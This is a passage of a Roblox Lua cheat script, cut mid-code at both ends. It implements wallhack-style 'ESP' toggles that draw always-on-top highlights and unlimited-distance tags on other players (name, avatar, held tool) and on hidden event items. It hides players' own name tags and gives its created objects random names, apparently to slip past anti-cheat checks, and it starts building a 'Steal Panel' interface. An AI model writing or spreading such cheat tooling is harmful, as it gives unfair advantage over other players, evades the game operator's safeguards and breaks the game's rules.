					v19.Highlight:Destroy()
					v19.Tag:Destroy()
				end)
			end

			local function fn22()
				local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")

				for _, v19 in ipairs(tbl26) do
					local v20 = drScrambleEvent and drScrambleEvent:FindFirstChild(v19.Id)
					local hitbox = v20 and (v20:FindFirstChild("Hitbox", true) or v20.PrimaryPart or v20:FindFirstChildWhichIsA("BasePart", true))
					local tbl28 = tbl27[v19.Id]

					if tbl28 and (tbl28.Model ~= v20 or not hitbox) then
						fn21(v19.Id)
						tbl28 = nil
					end

					if hitbox and not tbl28 then
						if not v17 or not v17.Parent then
							v17 = tbl6.CreateRuntime()
						end

						local highlight = Instance.new("Highlight")
						highlight.Name = fn3()
						highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
						highlight.FillTransparency = 0.7
						highlight.OutlineTransparency = 0.02
						highlight.Adornee = v20
						highlight.Parent = v17
						local v21, v22 = tbl6.CreateTag(v17, 25000)
						v21.Adornee = hitbox
						v21.StudsOffsetWorldSpace = Vector3.new(0, 4, 0)
						local floor = math.floor
						v21.Size = UDim2.fromOffset(tbl6.ScaledWidth(160), floor(tbl6.RowHeight() * 1.6))
						local v23 = tbl6.CreateTextRow(v22, tbl6.StatusFont, 1, 0.5)
						local v24 = tbl6.CreateTextRow(v22, tbl6.StatusFont, 2, 0.5)
						tbl6.SetRow(v23, v19.Label, tbl6.Palettes.Sheen)
						tbl28 = { Model = v20, Hitbox = hitbox, Highlight = highlight, Tag = v21, InfoRow = v24 }
						tbl27[v19.Id] = tbl28
					end

					if tbl28 then
						local flag7 = type(tbl4.ScrambleLostPart) == "function" and tbl4.ScrambleLostPart(v19.Id) == true
						local v21 = flag7 and accent or v16
						tbl6.SetRow(tbl28.InfoRow, flag7 and "Collected" or string.format("%d studs", math.floor(tbl4.DistanceTo(tbl28.Hitbox.Position))), v21)
						tbl28.Highlight.FillColor = v21.Outline
						tbl28.Highlight.OutlineColor = v21.Outline
					end
				end
			end

			local function fn23()
				flag4 = false

				if connection then
					connection:Disconnect()
					connection = nil
				end

				for k in pairs(tbl27) do
					fn21(k)
				end

				if v17 then
					v17:Destroy()
					v17 = nil
				end
			end

			local function fn24()
				if flag4 then
					return
				end
				flag4 = true
				local n21 = 1

				connection = RunService.Heartbeat:Connect(function(deltaTime)
					n21 += deltaTime

					if n21 >= 0.3 then
						n21 = 0
						pcall(fn22)
					end
				end)
			end

			local function fn25()
				if flag6 then
					return
				end

				if tbl6.ReadToggle(v18, flag5) then
					fn24()
				elseif flag4 then
					fn23()
				end
			end

			fn4(function()
				flag6 = true
				fn23()
			end)

			v18 = espSection:CreateToggle({
				Name = "ESP Lost Parts",
				Default = false,
				Callback = function(arg)
					flag5 = arg == true
					tbl6.SyncSoon(fn25)
				end,
			})
		end

		local font, v16, flag4, n21, v17, tbl26, tbl27, tbl28, n22, tbl29
		local v18, flag5, flag6

		do
			local TextService = game:GetService("TextService")
			font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
			local colorSequence = ColorSequence.new
			local tbl30 = {}
			local v19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 255, 205))
			local v20 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(125, 225, 255))
			tbl30[1] = v19
			tbl30[2] = v20

			do
				local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(210, 135, 255)))
				table.move(values, 1, values.n, 3, tbl30)
			end

			v16 = colorSequence(tbl30)

			local colorSequence2 = ColorSequence.new({
				ColorSequenceKeypoint.new(0, Color3.fromRGB(7, 73, 66)),
				ColorSequenceKeypoint.new(1, Color3.fromRGB(35, 17, 79)),
			})

			flag4 = false
			n21 = 0
			v17 = nil
			tbl26 = {}
			tbl27 = {}
			tbl28 = {}
			local tbl31 = {}
			n22 = 0.75
			tbl29 = { Name = true, Username = false, Avatar = false, Tool = true }
			v18 = nil
			flag5 = false
			flag6 = false

			local function fn21(arg)
				local str = tostring(arg or "")
				if str:match("^%d+$") then
					return "rbxassetid://" .. str
				end
				return str
			end

			local function fn22(arg)
				if not arg or not arg:IsA("Tool") then
					return ""
				end
				local v21 = fn21(arg.TextureId)
				if v21 ~= "" then
					return v21
				end

				for _, v22 in ipairs({ "Icon", "Image", "Thumbnail", "TextureId" }) do
					local attribute = arg:GetAttribute(v22)
					if type(attribute) == "string" and fn21(attribute) ~= "" then
						return fn21(attribute)
					end
				end

				for _, descendant in ipairs(arg:GetDescendants()) do
					if descendant:IsA("Decal") or descendant:IsA("Texture") then
						v21 = fn21(descendant.Texture)
					elseif descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then
						v21 = fn21(descendant.Image)
					end

					if v21 ~= "" then
						return v21
					end
				end

				return ""
			end

			local function fn23()
				local currentCamera = workspace.CurrentCamera
				return math.max(1, math.floor(math.clamp((currentCamera and currentCamera.ViewportSize.Y or 1080) * 0.024, 26, 35) * n22))
			end

			local function fn24(text, size)
				local str = text .. "@" .. size
				local v21 = tbl31[str]
				if v21 then
					return v21
				end
				local getTextBoundsParams = Instance.new("GetTextBoundsParams")
				getTextBoundsParams.Text = text
				getTextBoundsParams.Font = font
				getTextBoundsParams.Size = size
				getTextBoundsParams.Width = 1000

				local ok, result = pcall(function()
					return TextService:GetTextBoundsAsync(getTextBoundsParams)
				end)

				getTextBoundsParams:Destroy()
				ok = ok and result.X
				local n23

				if ok then
					n23 = ok
				else
					n23 = (utf8.len(text) or #text) * size * 0.56
				end

				tbl31[str] = n23
				return n23
			end

			local function fn25(arg, color3, arg2, arg3)
				arg.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
				arg.Color = color3
				arg.LineJoinMode = Enum.LineJoinMode.Round
				arg.Transparency = 0

				arg.Thickness = pcall(function()
					arg.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
				end) and arg2 or arg3
			end

			local function createTextLabel(parent, zIndex)
				local textLabel = Instance.new("TextLabel")
				textLabel.Name = fn3()
				textLabel.AnchorPoint = Vector2.new(0, 0.5)
				textLabel.BackgroundTransparency = 1
				textLabel.FontFace = font
				textLabel.Text = ""
				textLabel.TextScaled = true
				textLabel.TextStrokeTransparency = 1
				textLabel.TextXAlignment = Enum.TextXAlignment.Center
				textLabel.TextYAlignment = Enum.TextYAlignment.Center
				textLabel.ZIndex = zIndex
				textLabel.Parent = parent
				return textLabel
			end

			local function createImageLabel(parent, zIndex)
				local imageLabel = Instance.new("ImageLabel")
				imageLabel.Name = fn3()
				imageLabel.AnchorPoint = Vector2.new(0, 0.5)
				imageLabel.BackgroundTransparency = 1
				imageLabel.ScaleType = Enum.ScaleType.Fit
				imageLabel.ZIndex = zIndex
				imageLabel.Parent = parent
				local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
				uiAspectRatioConstraint.Name = fn3()
				uiAspectRatioConstraint.AspectRatio = 1
				uiAspectRatioConstraint.Parent = imageLabel
				return imageLabel
			end

			local function fn26(arg)
				local v21 = fn23()
				local visible = tbl29.Name == true or tbl29.Username == true
				local visible2 = tbl29.Avatar == true
				local visible3 = tbl29.Tool == true and arg.ToolIcon.Image ~= ""
				local n23 = visible2 and math.floor(v21 * 0.72) or 0
				local n24 = visible3 and math.floor(v21 * 0.82) or 0
				local n25 = math.floor(v21 * 0.7)
				local n26 = math.max(1, math.floor(v21 * 0.04))
				local name = tbl29.Username == true and arg.Player.Name or arg.Player.DisplayName
				arg.Name.Text = name
				arg.Shadow.Text = name
				local n27 = visible and math.floor(math.clamp(fn24(name, n25) + 4, n25, 230)) or 0
				local n28 = 0
				local n29 = 0

				if visible2 then
					n29 = 0 + n23
				end

				local n30 = 0

				if visible then
					if not (n29 > 0) then
						n30 = n29
					else
						n30 = n29 + n26
					end

					n29 = n30 + n27
				end

				local n31 = 0
				local n32

				if visible3 then
					if n29 > 0 then
						n29 += n26
					end

					n31 = n29
					n32 = n29 + n24
				else
					n32 = n29
				end

				local n33 = math.max(n32, 1)
				local n34 = 1 / n33
				local n35 = 1 / v21
				arg.Billboard.Size = UDim2.fromOffset(n33, v21)
				arg.Avatar.Visible = visible2
				arg.Name.Visible = visible
				arg.Shadow.Visible = visible
				arg.ToolIcon.Visible = visible3
				arg.ToolShadow.Visible = visible3
				arg.Avatar.Position = UDim2.fromScale(n28 / n33, 0.5)
				arg.Avatar.Size = UDim2.fromScale(n23 / n33, n23 / v21)
				arg.Name.Position = UDim2.fromScale(n30 / n33, 0.5)
				arg.Name.Size = UDim2.fromScale(n27 / n33, n25 / v21)
				arg.Shadow.Position = UDim2.fromScale(n30 / n33 + n34, 0.5 + n35)
				arg.Shadow.Size = arg.Name.Size
				arg.ToolIcon.Position = UDim2.fromScale(n31 / n33, 0.5)
				arg.ToolIcon.Size = UDim2.fromScale(n24 / n33, n24 / v21)
				arg.ToolShadow.Position = UDim2.fromScale(n31 / n33 + n34, 0.5 + n35)
				arg.ToolShadow.Size = arg.ToolIcon.Size
			end

			local function fn27(arg, adornee, arg2, arg3)
				local highlight = Instance.new("Highlight")
				highlight.Name = fn3()
				highlight.Adornee = adornee
				highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
				highlight.FillColor = Color3.fromRGB(0, 67, 148)
				highlight.FillTransparency = 0.76
				highlight.OutlineColor = Color3.fromRGB(72, 207, 255)
				highlight.OutlineTransparency = 0.02
				highlight.Parent = v17
				local v21 = arg3 or arg2
				local n23 = 3.1

				if v21 ~= arg2 then
					n23 = math.clamp(arg2.Position.Y - v21.Position.Y + 3.1, 3.8, 6)
				end

				local billboardGui = Instance.new("BillboardGui")
				billboardGui.Name = fn3()
				billboardGui.Adornee = v21
				billboardGui.AlwaysOnTop = true
				billboardGui.LightInfluence = 0
				billboardGui.MaxDistance = math.huge
				billboardGui.Size = UDim2.fromOffset(1, 1)
				billboardGui.StudsOffsetWorldSpace = Vector3.new(0, n23, 0)
				billboardGui.Parent = v17
				local frame = Instance.new("Frame")
				frame.Name = fn3()
				frame.Size = UDim2.fromScale(1, 1)
				frame.BackgroundTransparency = 1
				frame.Parent = billboardGui
				local v22 = createImageLabel(frame, 2)
				v22.ScaleType = Enum.ScaleType.Crop
				local uiCorner = Instance.new("UICorner")
				uiCorner.Name = fn3()
				uiCorner.CornerRadius = UDim.new(1, 0)
				uiCorner.Parent = v22
				local v23 = createTextLabel(frame, 1)
				v23.TextColor3 = Color3.fromRGB(7, 19, 34)
				v23.TextTransparency = 0.05
				local v24 = createTextLabel(frame, 2)
				v24.TextColor3 = Color3.fromRGB(255, 255, 255)
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Name = fn3()
				fn25(uiStroke, Color3.fromRGB(255, 255, 255), 0.044, 1.4)
				uiStroke.Parent = v24
				local uiGradient = Instance.new("UIGradient")
				uiGradient.Name = fn3()
				uiGradient.Color = colorSequence2
				uiGradient.Rotation = 90
				uiGradient.Parent = uiStroke
				local uiGradient2 = Instance.new("UIGradient")
				uiGradient2.Name = fn3()
				uiGradient2.Color = v16
				uiGradient2.Rotation = 90
				uiGradient2.Parent = v24
				local v25 = createImageLabel(frame, 1)
				v25.ImageColor3 = Color3.fromRGB(0, 0, 0)
				v25.ImageTransparency = 0.35

				local tbl32 = {
					Player = arg,
					Highlight = highlight,
					Billboard = billboardGui,
					Avatar = v22,
					Shadow = v23,
					Name = v24,
					ToolShadow = v25,
					ToolIcon = createImageLabel(frame, 2),
				}

				fn26(tbl32)
				return tbl32
			end

			local function fn28(arg)
				if arg.NameHumanoid and arg.NameHumanoid.Parent and arg.NameDistance ~= nil then
					pcall(function()
						arg.NameHumanoid.NameDisplayDistance = arg.NameDistance
					end)
				end

				arg.NameHumanoid = nil
				arg.NameDistance = nil
			end

			local function fn29(arg, nameHumanoid)
				nameHumanoid = nameHumanoid and nameHumanoid:FindFirstChildOfClass("Humanoid")
				if not nameHumanoid then
					return
				end

				if arg.NameHumanoid ~= nameHumanoid then
					fn28(arg)
					arg.NameHumanoid = nameHumanoid
					arg.NameDistance = nameHumanoid.NameDisplayDistance
				end

				pcall(function()
					nameHumanoid.NameDisplayDistance = 0
				end)
			end

			local function fn30(arg)
				tbl6.DisconnectAll(arg.CharacterConnections)

				if arg.Tag then
					pcall(function()
						arg.Tag.Highlight:Destroy()
					end)

					pcall(function()
						arg.Tag.Billboard:Destroy()
					end)

					arg.Tag = nil
				end

				fn28(arg)
				arg.Character = nil
			end

			local function fn31(arg)
				if not arg.Tag or not arg.Character then
					return
				end
				local v21 = fn22(arg.Character:FindFirstChildOfClass("Tool"))
				arg.Tag.ToolIcon.Image = v21
				arg.Tag.ToolShadow.Image = v21
				fn26(arg.Tag)
			end

			local function fn32(arg, arg2, arg3)
				local image = tbl28[arg2.UserId]

				if image == nil then
					local ok, result = pcall(function()
						return Players:GetUserThumbnailAsync(arg2.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
					end)

					image = ok and result or ""
					tbl28[arg2.UserId] = image
				end

				if flag4 and arg.Version == arg3 and arg.Tag then
					arg.Tag.Avatar.Image = image
				end
			end

			local function fn33(arg, arg2, character)
				fn30(arg)
				arg.Version = arg.Version + 1
				local version = arg.Version
				if not flag4 or not character then
					return
				end
				arg.Character = character

				task.spawn(function()
					local head = character:FindFirstChild("Head") or character:WaitForChild("Head", 5)
					if not flag4 or arg.Version ~= version or not head or not head:IsA("BasePart") or not character:IsDescendantOf(workspace) then
						return
					end

					if not v17 or not v17.Parent then
						v17 = tbl6.CreateRuntime()
					end

					local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
					arg.Tag = fn27(arg2, character, head, humanoidRootPart and humanoidRootPart:IsA("BasePart") and humanoidRootPart or nil)
					fn29(arg, character)

					local function fn34()
						task.defer(function()
							if flag4 and arg.Version == version then
								fn31(arg)
							end
						end)
					end

					table.insert(arg.CharacterConnections, character.ChildAdded:Connect(function(child)
						if child:IsA("Tool") then
							fn34()
						elseif child:IsA("Humanoid") then
							fn29(arg, character)
						end
					end))

					table.insert(arg.CharacterConnections, character.ChildRemoved:Connect(function(child)
						if child:IsA("Tool") then
							fn34()
						end
					end))

					table.insert(arg.CharacterConnections, character.AncestryChanged:Connect(function()
						if arg.Version == version and not character:IsDescendantOf(workspace) then
							arg.Version = arg.Version + 1
							fn30(arg)
						end
					end))

					fn31(arg)
					fn32(arg, arg2, version)
				end)
			end

			local function fn34(player)
				local v21 = tbl26[player]
				if not v21 then
					return
				end
				v21.Version = v21.Version + 1
				fn30(v21)
				tbl6.DisconnectAll(v21.PlayerConnections)
				tbl26[player] = nil
			end

			local function fn35(player)
				if player == localPlayer or tbl26[player] then
					return
				end

				local tbl32 = {
					Version = 0,
					Character = nil,
					Tag = nil,
					NameHumanoid = nil,
					NameDistance = nil,
					CharacterConnections = {},
					PlayerConnections = {},
				}

				tbl26[player] = tbl32

				table.insert(tbl32.PlayerConnections, player.CharacterAdded:Connect(function(character)
					fn33(tbl32, player, character)
				end))

				table.insert(tbl32.PlayerConnections, player.CharacterRemoving:Connect(function(character)
					if tbl32.Character == character then
						tbl32.Version = tbl32.Version + 1
						fn30(tbl32)
					end
				end))

				fn33(tbl32, player, player.Character)
			end

			local function fn36()
				for _, v21 in pairs(tbl26) do
					if v21.Tag then
						fn26(v21.Tag)
					end
				end
			end

			local function fn37()
				flag4 = false
				n21 += 1
				tbl6.DisconnectAll(tbl27)
				local tbl32 = {}

				for k in pairs(tbl26) do
					table.insert(tbl32, k)
				end

				for _, v21 in ipairs(tbl32) do
					fn34(v21)
				end

				if v17 then
					v17:Destroy()
					v17 = nil
				end
			end

			local function fn38()
				if flag4 then
					return
				end
				flag4 = true
				n21 += 1
				local v21 = n21
				v17 = tbl6.CreateRuntime()

				for _, player in ipairs(Players:GetPlayers()) do
					fn35(player)
				end

				table.insert(tbl27, Players.PlayerAdded:Connect(fn35))
				table.insert(tbl27, Players.PlayerRemoving:Connect(fn34))
				local currentCamera = workspace.CurrentCamera

				if currentCamera then
					table.insert(tbl27, currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn36))
				end

				task.spawn(function()
					while true do
						if flag4 and v21 == n21 then
							task.wait(1)

							if not (not flag4 or v21 ~= n21) then
								for k, v22 in pairs(tbl26) do
									local character = k.Character
									local adornee = v22.Tag and v22.Tag.Billboard.Parent and v22.Tag.Billboard.Adornee and v22.Tag.Billboard.Adornee:IsDescendantOf(workspace)

									if character and character:IsDescendantOf(workspace) and (v22.Character ~= character or not adornee) then
										fn33(v22, k, character)
									end
								end

								continue
							end
						end

						break
					end
				end)
			end

			local function fn39()
				if flag6 then
					return
				end

				if tbl6.ReadToggle(v18, flag5) then
					fn38()
				elseif flag4 then
					fn37()
				end
			end

			fn4(function()
				flag6 = true
				fn37()
			end)

			v18 = espSection:CreateToggle({
				Name = "ESP Players",
				Default = false,
				Callback = function(arg)
					flag5 = arg == true
					tbl6.SyncSoon(fn39)
				end,
			})

			fn6(espSection:CreateMultiDropdown({
				Name = "ESP Player Info",
				Options = { "Name", "Username", "Avatar", "Tool" },
				Default = { "Name", "Tool" },
				SubOf = v18,
				Callback = function(arg)
					local tbl32 = { Name = false, Username = false, Avatar = false, Tool = false }

					if type(arg) == "table" then
						for k, v21 in pairs(arg) do
							if type(v21) == "string" and tbl32[v21] ~= nil then
								tbl32[v21] = true
							elseif type(k) == "string" and v21 == true and tbl32[k] ~= nil then
								tbl32[k] = true
							end
						end
					end

					tbl29 = tbl32
					fn36()
				end,
			}))

			espSection:CreateSlider({
				Name = "ESP Player Size",
				Min = 50,
				Max = 200,
				Default = 75,
				Increment = 5,
				Unit = "%",
				SubOf = v18,
				Callback = function(arg)
					local num = tonumber(arg)

					if num and n22 ~= num / 100 then
						n22 = math.clamp(num / 100, 0.5, 2)
						fn36()
					end
				end,
			})
		end

		n4 = 3
		n5 = 0.002
		n6 = 4
		n7 = 0.3
		n8 = 0.62
		n9 = 0.86
		n10 = 4.4262295081967213
		n11 = 1.392
		n12 = 1.03
		tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
		tweenInfo2 = TweenInfo.new(0.24, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
		tweenInfo3 = TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
		tweenInfo4 = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
		tweenInfo5 = TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		TweenService = game:GetService("TweenService")
		color2 = Color3.fromRGB

		fn15 = function(arg)
			local tbl30 = {}

			for i, v19 in ipairs(arg) do
				tbl30[i] = ColorSequenceKeypoint.new(v19[1], v19[2])
			end

			return ColorSequence.new(tbl30)
		end

		tbl17 = {}

		do
			local hud = {}
			local tbl30 = {}
			local tbl31 = { 0, color2(0, 118, 255) }
			local tbl32 = { 1, color2(72, 204, 255) }
			tbl30[1] = tbl31
			tbl30[2] = tbl32
			hud.Color = fn15(tbl30)
			hud.Rotation = -90
			hud.Stroke = color2(0, 28, 76)
			hud.Light = color2(172, 226, 255)
			tbl17.Hud = hud
		end

		do
			local steal = {}
			local tbl30 = {}
			local tbl31 = { 0, color2(60, 255, 0) }
			local tbl32 = { 1, color2(136, 255, 0) }
			tbl30[1] = tbl31
			tbl30[2] = tbl32
			steal.Color = fn15(tbl30)
			steal.Rotation = -90
			steal.Stroke = color2(11, 72, 0)
			steal.Light = color2(190, 255, 180)
			tbl17.Steal = steal
		end

		do
			local queued = {}
			local tbl30 = {}
			local tbl31 = { 0, color2(118, 118, 132) }
			local tbl32 = { 1, color2(172, 172, 186) }
			tbl30[1] = tbl31
			tbl30[2] = tbl32
			queued.Color = fn15(tbl30)
			queued.Rotation = -90
			queued.Stroke = color2(28, 28, 34)
			queued.Light = color2(214, 214, 226)
			tbl17.Queued = queued
		end

		do
			local priorityOn = {}
			local tbl30 = {}
			local tbl31 = { 0, color2(255, 247, 0) }
			local tbl32 = { 1, color2(255, 136, 0) }
			tbl30[1] = tbl31
			tbl30[2] = tbl32
			priorityOn.Color = fn15(tbl30)
			priorityOn.Rotation = 90
			priorityOn.Stroke = color2(0, 0, 0)
			priorityOn.Light = color2(132, 112, 0)
			tbl17.PriorityOn = priorityOn
		end

		do
			local cancel = {}
			local tbl30 = {}
			local tbl31 = { 0, color2(214, 17, 17) }
			local tbl32 = { 1, color2(253, 20, 20) }
			tbl30[1] = tbl31
			tbl30[2] = tbl32
			cancel.Color = fn15(tbl30)
			cancel.Rotation = -90
			cancel.Stroke = color2(72, 0, 0)
			cancel.Light = color2(255, 103, 103)
			tbl17.Cancel = cancel
		end

		do
			local chilli = {}
			local tbl30 = {}
			local tbl31 = { 0, color2(132, 74, 255) }
			local tbl32 = { 0.34, color2(178, 74, 255) }
			local tbl33 = { 0.6, color2(255, 104, 206) }
			local tbl34 = { 0.78, color2(255, 168, 232) }
			local tbl35 = { 1, color2(146, 66, 255) }
			tbl30[1] = tbl31
			tbl30[2] = tbl32
			tbl30[3] = tbl33
			tbl30[4] = tbl34
			tbl30[5] = tbl35
			chilli.Color = fn15(tbl30)
			chilli.Rotation = -115
			chilli.Stroke = color2(44, 10, 80)
			chilli.Light = color2(226, 178, 255)
			tbl17.Chilli = chilli
		end

		tbl18 = {}

		do
			local tbl30 = { 0, color2(255, 255, 255) }
			local tbl31 = { 0.2, color2(206, 212, 224) }
			local tbl32 = { 0.42, color2(74, 80, 94) }
			local tbl33 = { 0.58, color2(42, 46, 56) }
			local tbl34 = { 0.78, color2(158, 166, 182) }
			local tbl35 = { 1, color2(250, 252, 255) }
			tbl18[1] = tbl30
			tbl18[2] = tbl31
			tbl18[3] = tbl32
			tbl18[4] = tbl33
			tbl18[5] = tbl34
			tbl18[6] = tbl35
		end
	end

	local v11, v12

	do
		local v13 = fn15(tbl18)
		local tbl19 = {}
		local rarityGradients = nil

		local function fn16(arg)
			local v14 = tbl19[arg]
			if v14 then
				return v14
			end
			local directory = tbl.Assets and tbl.Assets.Directory
			local flag2 = type(directory) == "table" and directory[arg] or nil
			local rarity = type(flag2) == "table" and type(flag2.Rarity) == "table" and flag2.Rarity or nil
			local rarityGradient = rarity and rarity.RarityGradient or nil

			if rarity and typeof(rarityGradient) ~= "Instance" then
				if rarityGradients == nil then
					local assets = ReplicatedStorage:FindFirstChild("Assets")
					assets = assets and assets:FindFirstChild("UI")
					rarityGradients = assets and assets:FindFirstChild("RarityGradients") or false
				end

				rarityGradient = rarityGradients

				if rarityGradients then
					rarityGradient = rarityGradients:FindFirstChild(tostring(rarity._id or rarity.DisplayName or ""))
				end

				rarityGradient = rarityGradient and rarityGradient:FindFirstChild("RarityGradient") or nil
			end

			local str

			if rarity then
				str = tostring(rarity.DisplayName or rarity._id or "")
			else
				str = rarity
			end

			str = str or ""
			local color3 = rarity and typeof(rarity.Color) == "Color3" and rarity.Color or color2(255, 255, 255)
			local color4 = fn15({ { 0, color3 }, { 1, color3 } })
			local gradientRotation

			if string.upper(str) == "SECRET" then
				gradientRotation = 90
				color4 = v13
			else
				local isUIGradient = typeof(rarityGradient) == "Instance" and rarityGradient:IsA("UIGradient")
				gradientRotation = 90

				if isUIGradient then
					color4 = rarityGradient.Color
					gradientRotation = rarityGradient.Rotation
				end
			end

			local icon = type(flag2) == "table" and flag2.Icon or nil

			if tonumber(icon) then
				icon = "rbxassetid://" .. tostring(icon)
			end

			local tbl20 = {}
			local flag3 = type(flag2) == "table"
			local name

			if flag3 then
				name = tostring(flag2.DisplayName or arg)
			else
				name = flag3
			end

			tbl20.Name = name or tostring(arg)
			tbl20.Icon = icon and tostring(icon) or ""

			if rarity then
				rarity = tonumber(rarity.RarityNumber or rarity.Rank)
			end

			tbl20.RarityNumber = rarity or 0
			tbl20.GradientColor = color4
			tbl20.GradientRotation = gradientRotation
			tbl20.EarningRate = type(flag2) == "table" and tonumber(flag2.EarningRate) or 0
			tbl19[arg] = tbl20
			return tbl20
		end

		local function fn17(arg, arg2)
			local n13 = tonumber(arg.AssetScale) or 1
			local n14 = n13 > 5 and (n13 / 5) ^ 1.2 * 19.637875755794113 or n13 ^ 1.85
			local mutations = type(arg.Mutations) == "table" and arg.Mutations or {}

			if #mutations == 0 and type(arg.BaseMutation) == "string" and arg.BaseMutation ~= "" then
				mutations = { arg.BaseMutation }
			end

			local mutations2 = tbl.Mutations
			local flag2 = type(mutations2) == "table" and type(mutations2.EarningsFor) == "function"
			local n15 = 1

			if flag2 then
				local ok
				ok, n15 = pcall(mutations2.EarningsFor, mutations)
				ok = ok and type(n15) == "number"
				local n16 = 1

				if not ok then
					n15 = n16
				end
			end

			return arg2.EarningRate * n14 * n15
		end

		local tbl20 = { "", "K", "M", "B", "T", "Qa", "Qi", "Sx" }

		local function fn18(arg)
			local n13 = tonumber(arg) or 0
			local n14 = 1

			while n13 >= 1000 and n14 < #tbl20 do
				n13 /= 1000
				n14 += 1
			end

			local str = n14 == 1 and tostring(math.floor(n13)) or string.format("%.1f", math.floor(n13 * 10) / 10)
			local str2 = tbl20[n14] .. "/s"
			return "$" .. string.gsub(str, "%.0$", "") .. str2
		end

		local function fn19(arg, text)
			if arg and arg.Text ~= text then
				arg.Text = text
			end
		end

		local flag2 = false
		local n13 = 0
		local flag3 = false
		local v14 = nil
		local v15 = nil
		local v16 = nil
		local imageLabel = nil
		local v17 = nil
		local v18 = nil
		local position = nil
		local title = nil
		local v19 = nil
		local v20 = nil
		local v21 = nil
		local flag4 = false
		local v22 = v2:CreateState({ Name = "Steal Panel Open", Default = true })
		local flag5 = false
		local tween = nil
		local tween2 = nil
		local n14 = 0
		local tbl21 = nil
		local tbl22 = nil
		local n15 = 1
		local tbl23 = {}
		local tbl24 = {}
		local tbl25 = {}
		local obj = setmetatable({}, { __mode = "k" })
		local uiStroke = nil
		local thickness = nil
		local flag6 = false
		local flag7 = false
		local flag8 = false
		local fn20 = nil

		local function fn21()
			local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
			local hud = playerGui and playerGui:FindFirstChild("HUD")
			local gameHUD = hud and hud:FindFirstChild("GameHUD")
			local rightButtons = gameHUD and gameHUD:FindFirstChild("RightButtons")
			local activePets = playerGui and playerGui:FindFirstChild("ActivePets")

			local tbl26 = {
				Hud = hud,
				GameHud = gameHUD,
				Column = rightButtons,
				Eggs = rightButtons and rightButtons:FindFirstChild("EggsButton"),
				Pets = rightButtons and rightButtons:FindFirstChild("PetsButton"),
				ActivePets = activePets,
				GrowingEggs = playerGui and playerGui:FindFirstChild("GrowingEggs"),
			}

			if not (hud and gameHUD and rightButtons and tbl26.Eggs and tbl26.Pets and activePets and activePets:FindFirstChild("Frame")) then
				return nil
			end
			return tbl26
		end

		local function fn22(arg)
			local ok, result = pcall(function()
				return arg:Clone()
			end)

			if not ok or typeof(result) ~= "Instance" then
				return nil
			end

			for _, descendant in ipairs(result:GetDescendants()) do
				if descendant:IsA("LuaSourceContainer") then
					descendant:Destroy()
				end
			end

			return result
		end

		local function fn23(arg)
			arg.Name = fn3()

			for _, descendant in ipairs(arg:GetDescendants()) do
				descendant.Name = fn3()
			end
		end

		local n16 = 2.3120369911193848
		local n17 = 556
		local n18 = 86.24
		local tbl26 = { Panel = n16, Hud = n16 }

		local function fn24(arg)
			if arg then
				local x = v18 and v18.AbsoluteSize.X or 0
				return x > 0 and n16 * x / n17 or nil
			end
			local button = v16 and v16.Button
			button = button and button.Size.X.Offset or 0
			return button > 0 and n16 * button / n18 or nil
		end

		local function fn25(arg, arg2)
			local v23 = fn24(arg2.Panel)

			if v23 and arg.Parent then
				arg.Thickness = arg2.Ratio * v23
			end
		end

		local function fn26(arg, arg2)
			local panel = arg2 and tbl26.Panel or tbl26.Hud

			if not panel or panel <= 0 then
				panel = 2.3120369911193848
			end

			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant:IsA("UIStroke") then
					local ok, result = pcall(function()
						return descendant.StrokeSizingMode
					end)

					if not ok or result ~= Enum.StrokeSizingMode.ScaledSize then
						local tbl27 = { Ratio = descendant.Thickness / panel, Panel = arg2 == true }
						obj[descendant] = tbl27
						fn25(descendant, tbl27)
					end
				end
			end
		end

		local function fn27()
			for k, v23 in pairs(obj) do
				fn25(k, v23)
			end
		end

		local function fn28()
			fn27()
		end

		local function fn29(arg)
			if not arg then
				return nil
			end

			return {
				Button = arg,
				Gradient = arg:FindFirstChildOfClass("UIGradient"),
				Stroke = arg:FindFirstChild("UIStroke"),
				Light = arg:FindFirstChild("UIStrokeClr"),
				Label = arg:FindFirstChild("Label") or arg:FindFirstChild("TextLabel"),
				Scale = arg:FindFirstChild("BtnScale"),
			}
		end

		local function fn30(arg, style)
			if not arg or arg.Style == style then
				return
			end
			arg.Style = style

			if arg.Gradient then
				arg.Gradient.Color = style.Color
				arg.Gradient.Rotation = style.Rotation
			end

			if arg.Stroke then
				arg.Stroke.Color = style.Stroke
			end

			if arg.Light then
				arg.Light.Color = style.Light
			end
		end

		local function fn31(arg)
			if not arg then
				return
			end
			local scale = arg.Scale

			if not scale then
				scale = Instance.new("UIScale")
				scale.Parent = arg.Button
				arg.Scale = scale
			end

			local function fn32(arg2)
				TweenService:Create(scale, tweenInfo5, { Scale = arg2 }):Play()
			end

			arg.Button.MouseEnter:Connect(function()
				fn32(1.08)
			end)

			arg.Button.MouseLeave:Connect(function()
				fn32(1)
			end)

			arg.Button.MouseButton1Down:Connect(function()
				fn32(0.94)
			end)

			arg.Button.MouseButton1Up:Connect(function()
				fn32(1.08)
			end)
		end

		local tweenInfo6 = TweenInfo.new(2.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
